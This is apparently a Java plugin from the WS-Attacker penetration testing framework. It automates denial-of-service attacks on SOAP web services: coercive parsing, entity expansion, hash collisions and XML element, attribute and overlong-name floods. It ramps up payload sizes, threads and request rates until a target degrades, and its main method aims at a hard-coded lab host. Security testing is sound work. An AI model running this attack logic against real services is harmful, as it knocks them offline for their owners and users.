/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.intelligentdos;

import com.eviware.soapui.impl.WsdlInterfaceFactory;
import com.eviware.soapui.impl.wsdl.WsdlInterface;
import com.eviware.soapui.impl.wsdl.WsdlOperation;
import com.eviware.soapui.impl.wsdl.WsdlProject;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.submit.transports.http.WsdlResponse;
import com.eviware.soapui.model.iface.Request.SubmitException;
import com.eviware.soapui.model.iface.Response;
import com.eviware.soapui.support.SoapUIException;
import java.io.File;
import java.io.IOException;
import java.io.Writer;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import org.apache.commons.io.output.FileWriterWithEncoding;
import org.apache.commons.lang3.StringUtils;
import org.apache.xmlbeans.XmlException;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.library.intelligentdos.helper.IterateModel.IncreaseIncrementStrategie;
import wsattacker.library.intelligentdos.helper.IterateModel.IterateStrategie;
import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.testsuite.CurrentRequest;
import wsattacker.plugin.dos.CoerciveParsing;
import wsattacker.plugin.dos.HashCollisionDJBX31A;
import wsattacker.plugin.dos.HashCollisionDJBX33A;
import wsattacker.plugin.dos.HashCollisionDJBX33X;
import wsattacker.plugin.dos.XmlAttributeCount;
import wsattacker.plugin.dos.XmlElementCount;
import wsattacker.plugin.dos.XmlEntityExpansion;
import wsattacker.plugin.dos.XmlOverlongNames;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
import wsattacker.plugin.dos.dosExtension.attackThreads.PerformAttackThread;
import wsattacker.plugin.dos.dosExtension.attackThreads.RepeatAttackRequestThread;
import wsattacker.plugin.dos.dosExtension.logEntry.LogEntryRequest;
import wsattacker.plugin.dos.dosExtension.mvc.model.AttackModel;

/**
 * @author Christian Altmeier
 */
public class UnintelligentDoS
    extends AbstractPlugin
{

    /**
	 * 
	 */
    private static final long serialVersionUID = 1L;

    private static final String NAME = "Intelligent Denial-of-Service";

    private static final String DESCRIPTION = "Short description of Intelligent Denial-of-Service";

    private static final String AUTHOR = "Christian Altmeier";

    private static final String VERSION = "1.0 / 2013-12-31";

    private static final String[] CATEGORY = new String[] { "Denial of Service" };

    private static final int NUMBER_OF_SUCCESSES_NEEDED = 7;

    private boolean continueOnNumberRequests = false;

    private boolean continueOnNumberThreads = false;

    private String testPrefix = "";

    int count = 0;

    @Override
    public void initializePlugin()
    {
        setName( NAME );
        setDescription( DESCRIPTION );
        setAuthor( AUTHOR );
        setVersion( VERSION );
        setCategory( CATEGORY );

        setState( PluginState.Ready );
    }

    @Override
    public void clean()
    {
        setState( PluginState.Ready );
    }

    @Override
    public boolean wasSuccessful()
    {
        // successfull only server is vulnerable for one method
        // note: one point = possible server misconfiguration
        return getCurrentPoints() > 1;
    }

    @Override
    protected void attackImplementationHook( RequestResponsePair original )
    {

        // CoerciveParsing
        coerciveParsingAttack( original );

        // XmlAttributeCount
        xmlAttributeCountAttack( original );

        // XmlElementCount
        xmlElementCountAttack( original );

        // XmlEntityExpansion
        xmlEntityExpansionAttack( original );

        // HashCollisionDJBX31A
        hashCollisionDJBX31AAttack( original );

        // HashCollisionDJBX33A
        hashCollisionDJBX33AAttack( original );

        // HashCollisionDJBX33X
        hashCollisionDJBX33XAttack( original );

        // XmlOverlongNames
        xmlOverlongNamesAttack( original );
    }

    private void coerciveParsingAttack( RequestResponsePair original )
    {
        CoerciveParsing coerciveParsing = new CoerciveParsing();
        initializePlugin( original, coerciveParsing );

        // start 1.500
        // max 147.483.647
        IterateModel iterModel =
            IterateModel.custom().startAt( 512 ).stopAt( 16384 ).setIncrement( 2 ).setIterateStrategie( IterateStrategie.MUL ).setIncreaseIncrementStrategie( IncreaseIncrementStrategie.NO ).build();

        startIteration( iterModel, coerciveParsing, coerciveParsing.getOptionNumberTags() );
    }

    private void hashCollisionDJBX31AAttack( RequestResponsePair original )
    {
        HashCollisionDJBX31A hashCollisionDJBX31A = new HashCollisionDJBX31A();
        initializePlugin( original, hashCollisionDJBX31A );

        // start 10.000
        // max 99.999.999
        IterateModel iterModel = IterateModel.custom().startAt( 1250 ).stopAt( 180625 ).setIncrement( 1250 ).build();

        startIteration( iterModel, hashCollisionDJBX31A, hashCollisionDJBX31A.getOptionNumberAttributes() );
    }

    private void hashCollisionDJBX33AAttack( RequestResponsePair original )
    {
        HashCollisionDJBX33A hashCollisionDJBX33A = new HashCollisionDJBX33A();
        initializePlugin( original, hashCollisionDJBX33A );

        // start 10.000
        // max 99.999.999
        IterateModel iterModel = IterateModel.custom().startAt( 1250 ).stopAt( 180625 ).setIncrement( 1250 ).build();

        startIteration( iterModel, hashCollisionDJBX33A, hashCollisionDJBX33A.getOptionNumberAttributes() );
    }

    private void hashCollisionDJBX33XAttack( RequestResponsePair original )
    {
        HashCollisionDJBX33X hashCollisionDJBX33X = new HashCollisionDJBX33X();
        initializePlugin( original, hashCollisionDJBX33X );

        // start 10.000
        // max 99.999.999
        IterateModel iterModel = IterateModel.custom().startAt( 1250 ).stopAt( 21250 ).setIncrement( 1250 ).build();

        startIteration( iterModel, hashCollisionDJBX33X, hashCollisionDJBX33X.getOptionNumberAttributes() );
    }

    private void xmlAttributeCountAttack( RequestResponsePair original )
    {
        XmlAttributeCount xmlAttributeCount = new XmlAttributeCount();
        initializePlugin( original, xmlAttributeCount );

        // start 25.000
        // max 2.000.000
        IterateModel iterModel = IterateModel.custom().startAt( 3750 ).stopAt( 1431250 ).setIncrement( 1250 ).build();

        startIteration( iterModel, xmlAttributeCount, xmlAttributeCount.getOptionNumberAttributes() );
    }

    private void xmlElementCountAttack( RequestResponsePair original )
    {
        XmlElementCount xmlElementCount = new XmlElementCount();
        initializePlugin( original, xmlElementCount );

        // start 25.000
        // max 2.000.000
        // 1431250
        // CXF max 240000
        IterateModel iterModel = IterateModel.custom().startAt( 12500 ).stopAt( 240000 ).setIncrement( 5000 ).build();

        startIteration( iterModel, xmlElementCount, xmlElementCount.getOptionNumberOfElements() );
    }

    private void xmlEntityExpansionAttack( RequestResponsePair original )
    {
        XmlEntityExpansion xmlEntityExpansion = new XmlEntityExpansion();
        initializePlugin( original, xmlEntityExpansion );

        // start 20
        // max 200
        IterateModel iterModel = IterateModel.custom().startAt( 5 ).stopAt( 200 ).setIncrement( 5 ).build();

        AbstractOptionInteger optionNumberOfEntities = xmlEntityExpansion.getOptionNumberOfEntities();

        startIteration( iterModel, xmlEntityExpansion, optionNumberOfEntities );
    }

    private void xmlOverlongNamesAttack( RequestResponsePair original )
    {
        XmlOverlongNames xmlOverlongNames = new XmlOverlongNames();
        initializePlugin( original, xmlOverlongNames );

        AbstractOptionInteger[] options =
            { xmlOverlongNames.getOptionLengthOfElementName(), xmlOverlongNames.getOptionLengthOfAttributeName(),
                xmlOverlongNames.getOptionLengthOfAttributeValue() };
        OptionSimpleBoolean[] uses =
            { xmlOverlongNames.getUseLengthOfElementName(), xmlOverlongNames.getUseLengthOfAttributeName(),
                xmlOverlongNames.getUseLengthOfAttributeValue() };
        for ( OptionSimpleBoolean optionSimpleBoolean : uses )
        {
            optionSimpleBoolean.setOn( false );
        }

        String[] text = new String[options.length];
        for ( int i = 0; i < options.length; i++ )
        {
            text[i] = options[i].getName();
        }
        String[] abc = { "en", "an", "av" };

        // start 100.000
        // max 90.000.000
        for ( int i = 0; i < options.length; i++ )
        {
            testPrefix = abc[i];
            uses[i].setOn( true ); // activate

            IterateModel iterModel =
                IterateModel.custom().startAt( 75000 ).stopAt( 6900000 ).setIncrement( 75000 ).build();

            startIteration( iterModel, xmlOverlongNames, options[i] );
            uses[i].setOn( false ); // deactivate
        }

        for ( OptionSimpleBoolean optionSimpleBoolean : uses )
        {
            optionSimpleBoolean.setOn( true );
        }

        IterateModel iterModel = IterateModel.custom().startAt( 75000 ).stopAt( 5775000 ).setIncrement( 75000 ).build();
        testPrefix = StringUtils.join( abc, "_" );
        startIteration( iterModel, xmlOverlongNames, options );
    }

    private void startIteration( IterateModel iterModel, AbstractDosPlugin dosPlugin,
                                 AbstractOptionInteger... abstractOptionInteger )
    {
        String className = dosPlugin.getClass().getName();
        String s = className.substring( className.lastIndexOf( '.' ) + 1 );

        boolean successful = false;
        int unsuccessfulCount = 0;
        for ( int value = iterModel.getStartAt(); !successful && value <= iterModel.getStopAt(); value =
            iterModel.increment( value ) )
        {

            for ( AbstractOptionInteger aoi : abstractOptionInteger )
            {
                aoi.setValue( value );
            }

            successful = perform( dosPlugin, abstractOptionInteger );

            if ( !successful && ++unsuccessfulCount % 4 == 0 )
            {
                iterModel.increaseIncrement();
            }

            serverRecoveryTime();
        }
    }

    private void initializePlugin( RequestResponsePair original, AbstractDosPlugin dosPlugin )
    {
        dosPlugin.initializePlugin();
        // save OriginalRequestResponsePair pointer
        dosPlugin.setOriginalRequestResponsePair( original );

        // save Original Header Fields for all subsequent requests
        dosPlugin.createOriginalRequestHeaderFields();

        // dosPlugin.getOptionTextAreaSoapMessage().insertPayloadPlaceholder(
        // original.getWsdlRequest().getRequestContent());
        dosPlugin.getOptionTextAreaSoapMessage().currentRequestContentChanged( original.getWsdlRequest().getRequestContent(),
                                                                               "" );
    }

    private boolean perform( AbstractDosPlugin dosPlugin, AbstractOption... attackSpecificParam )
    {
        int maxNumberRequests = 32;
        int maxNumberThreads = 8;

        int successfulCounter = 0;

        // check if attack is feasable with given original SOAP message
        if ( dosPlugin.attackPrecheck() )
        {

            // create the tampered and untampered request
            dosPlugin.createTamperedRequest();
            dosPlugin.createUntamperedRequest();

            // create Request Padding
            dosPlugin.createRequestPadding();

            List<LogEntryRequest> untampered = performUntampered( dosPlugin, attackSpecificParam );

            int unsuccessfulRequestCounter = 0;
            for ( int numberRequests = 4; numberRequests <= maxNumberRequests; numberRequests += 4 )
            {
                if ( continueOnNumberRequests )
                {
                    numberRequests = 32;
                    continueOnNumberRequests = false;
                }

                dosPlugin.getOptionNumberRequests().setValue( numberRequests );

                int unsuccessfulThreadCounter = 0;
                for ( int numberThreads = 1; numberThreads <= maxNumberThreads; numberThreads++ )
                {
                    if ( continueOnNumberThreads )
                    {
                        numberThreads = 8;
                        continueOnNumberThreads = false;
                    }

                    dosPlugin.getOptionNumberThreads().setValue( numberThreads );

                    // 2000 -> 1000
                    int millisBetweenRequests = getMillisBetweenRequestsStart( unsuccessfulThreadCounter );
                    for ( ; millisBetweenRequests >= 250; millisBetweenRequests -= 250 )
                    {
                        dosPlugin.getOptionSecondsBetweenRequests().setValue( millisBetweenRequests );

                        startAttack( dosPlugin, untampered, attackSpecificParam );
                        count++;

                        if ( wasSuccessful() )
                        {
                            unsuccessfulRequestCounter = 0;
                            unsuccessfulThreadCounter = 0;
                            if ( ++successfulCounter > NUMBER_OF_SUCCESSES_NEEDED )
                            {
                                return true;
                            }
                        }
                        else
                        {
                            ++unsuccessfulRequestCounter;
                            ++unsuccessfulThreadCounter;
                            successfulCounter = 0;
                        }
                    }

                    if ( unsuccessfulThreadCounter >= 7 )
                    {
                        numberThreads += 2;
                    }
                }

                if ( unsuccessfulRequestCounter >= 20 )
                {
                    numberRequests += 4;
                }
            }

        }
        else
        {
            setCurrentPoints( 0 );
            important( "Attack not possible - Structure of SOAP Message is not suitable!" );
            setState( PluginState.Failed );
        }

        return false;
    }

    private int getMillisBetweenRequestsStart( int unsuccessfulCounter )
    {
        if ( unsuccessfulCounter >= 0 && unsuccessfulCounter < 4 )
        {
            return 1000;
        }
        else if ( unsuccessfulCounter >= 4 && unsuccessfulCounter < 7 )
        {
            return 750;
        }
        else if ( unsuccessfulCounter >= 7 && unsuccessfulCounter < 9 )
        {
            return 500;
        }
        else
        {
            return 250;
        }
    }

    private void startAttack( AbstractDosPlugin dosPlugin, List<LogEntryRequest> untampered,
                              AbstractOption... attackSpecificParam )
    {
        AbstractOption[] array;
        List<AbstractOption> list = new ArrayList<AbstractOption>( Arrays.asList( attackSpecificParam ) );
        list.add( dosPlugin.getOptionNumberRequests() );
        list.add( dosPlugin.getOptionNumberThreads() );
        list.add( dosPlugin.getOptionSecondsBetweenRequests() );
        array = list.toArray( new AbstractOption[list.size()] );

        // attack specific
        // number request
        // number threads
        // millis between requests

        AttackModel model = new AttackModel( dosPlugin );
        try
        {
            executeAttackModel( model, false );
            // discharge untampered logs and update with the reference logs
            model.getLogListUntamperedRequests().clear();
            model.getLogListUntamperedRequests().addAll( untampered );

            dosPlugin.setAttackModel( model );

            setCurrentPoints( model.getWsAttackerPoints() );

            if ( wasSuccessful() )
            {
                printOutSuccessful( array );
            }

        }
        catch ( InterruptedException e )
        {
            setCurrentPoints( 0 );
        }

        Writer writer = createWriter( dosPlugin, array );
        logWork( model, writer );
    }

    private void printOutSuccessful( AbstractOption[] array )
    {
        StringBuilder builder = new StringBuilder();
        for ( AbstractOption option : array )
        {
            if ( builder.length() != 0 )
            {
                builder.append( ", " );
            }
            builder.append( option.getValueAsString() );
        }
    }

    private List<LogEntryRequest> performUntampered( AbstractDosPlugin dosPlugin, AbstractOption... attackSpecificParam )
    {
        // to get Untampered
        dosPlugin.getOptionNumberRequests().setValue( 8 );
        dosPlugin.getOptionNumberThreads().setValue( 4 );
        dosPlugin.getOptionSecondsBetweenRequests().setValue( 750 );

        List<LogEntryRequest> untampered = new ArrayList<LogEntryRequest>();
        try
        {
            // perform DOS Attack
            AttackModel untamperedModel = new AttackModel( dosPlugin );

            List<Thread> threads = new ArrayList<Thread>( untamperedModel.getNumberThreads() );
            for ( int threadNumber = 0; threadNumber < untamperedModel.getNumberThreads(); threadNumber++ )
            {
                // New Repeat-Request N-Times Object
                Thread thread = new RepeatAttackRequestThread( untamperedModel, threadNumber, "untampered" );
                threads.add( thread );

                // Delay start of next thread for a couple of ms to prevent
                // sending at same time
                Thread.sleep( 5 );
            }

            for ( Thread thread : threads )
            {
                thread.join();
            }

            untampered = untamperedModel.getLogListUntamperedRequests();

            Writer writer = createWriter( "untampered", dosPlugin, attackSpecificParam );
            logWork( untamperedModel, writer );
        }
        catch ( InterruptedException e1 )
        {
            e1.printStackTrace();
        }

        return untampered;
    }

    public AttackModel executeAttackModel( AttackModel model, boolean sendUntampered )
        throws InterruptedException
    {

        // perform DOS Attack
        PerformAttackThread performAttackThread = new PerformAttackThread( model );
        performAttackThread.setSendUntampered( sendUntampered );

        performAttackThread.start();
        performAttackThread.join();

        return model;
    }

    private Writer createWriter( AbstractDosPlugin dosPlugin, AbstractOption... attackSpecificParam )
    {
        return createWriter( "", dosPlugin, attackSpecificParam );
    }

    private Writer createWriter( String prefix, AbstractDosPlugin dosPlugin, AbstractOption... attackSpecificParam )
    {
        Writer writer = null;
        try
        {
            StringBuilder builder = new StringBuilder();
            if ( StringUtils.isNotEmpty( testPrefix ) )
            {
                builder.append( testPrefix ).append( "_" );
            }
            if ( StringUtils.isNotEmpty( prefix ) )
            {
                builder.append( prefix ).append( "_" );
            }
            for ( AbstractOption option : attackSpecificParam )
            {
                if ( builder.length() != 0 )
                {
                    builder.append( "_" );
                }
                builder.append( option.getValueAsString() );
            }

            String fileName = builder.toString();
            String dir =
                System.getProperty( "user.home" ) + File.separator + "Documents" + File.separator + "wsa-"
                    + dosPlugin.getClass().getName();
            File p = new File( dir );
            if ( !p.exists() && !p.mkdir() )
            {
                throw new IOException( "could not create folder" );
            }
            File file = new File( dir, fileName );
            writer = new FileWriterWithEncoding( file, Charset.defaultCharset() );
        }
        catch ( IOException e1 )
        {
            e1.printStackTrace();
        }
        return writer;
    }

    private void logWork( AttackModel attackModel, Writer writer )
    {
        try
        {
            if ( writer != null )
            {

                for ( LogEntryRequest entryRequest : attackModel.getLogList() )
                {
                    writer.write( entryRequest.getType() + ", " + entryRequest.getTsSend() + ", "
                        + entryRequest.getTsReceived() + ", " + entryRequest.getDuration() + "\n" );
                }

                writer.close();
            }
        }
        catch ( IOException e )
        {
            e.printStackTrace();
        }
    }

    private void serverRecoveryTime()
    {
        try
        {
            // sleep 30 seconds before switch to the next number of tags
            Thread.sleep( 30 * 1000 );
        }
        catch ( InterruptedException e )
        {
            e.printStackTrace();
        }
    }

    public static void main( String[] args )
        throws SoapUIException, XmlException, IOException, SubmitException
    {
        WsdlRequest wsdlRequest = createWsdlRequest();

        // submit the request
        WsdlSubmit<WsdlRequest> submit = wsdlRequest.submit( new WsdlSubmitContext( wsdlRequest ), false );

        // wait for the response
        Response response = submit.getResponse();

        // print the response
        // String content = response.getContentAsString();
        // System.out.println(content);

        CurrentRequest original = new CurrentRequest();
        original.setWsdlRequest( wsdlRequest );
        original.setWsdlResponse( (WsdlResponse) response );

        // CurrentRequest original = new CurrentRequest();
        UnintelligentDoS doS = new UnintelligentDoS();
        doS.attackImplementationHook( original );

        System.exit( 0 );
    }

    private static WsdlRequest createWsdlRequest()
        throws XmlException, IOException, SoapUIException
    {
        // create new project
        WsdlProject project = new WsdlProject();

        String host = "pcy1095502";// gegenüber
        String port = "8080";

        // String url =
        // "http://" + host + ":" + port + "/Axis2WS/services/Converter?wsdl";
        // String url = "http://" + host + ":" + port +
        // "/Axis2WS/services/Converter?wsdl";
        // String url = "http://" + host + ":" + port +
        // "/AxisWS/wsdl/Converter.wsdl";
        String url = "http://" + host + ":" + port + "/CXFWS/services/ConverterPort?wsdl";

        // ASP2
        // String url =
        // "http://192.168.65.135/TemperatureWebService/Convert.asmx?WSDL";
        WsdlInterfaceFactory.importWsdl( project, url, false );

        // Soap11 or Soap 12
        WsdlInterface service = (WsdlInterface) project.getInterfaceAt( 0 );

        // ASP.NET
        // WsdlOperation wsdlOperation = service.getOperationByName("Reverser");
        WsdlOperation wsdlOperation = service.getOperationByName( "reverser" );

        // create a new empty request for that operation
        WsdlRequest wsdlRequest = wsdlOperation.addNewRequest( "Basic Request" );
        String requestContent = wsdlOperation.createRequest( true );
        requestContent = requestContent.replace( ">?</", ">Lorem ipsum dolor sit amet</" );
        wsdlRequest.setRequestContent( requestContent );

        return wsdlRequest;
    }
}
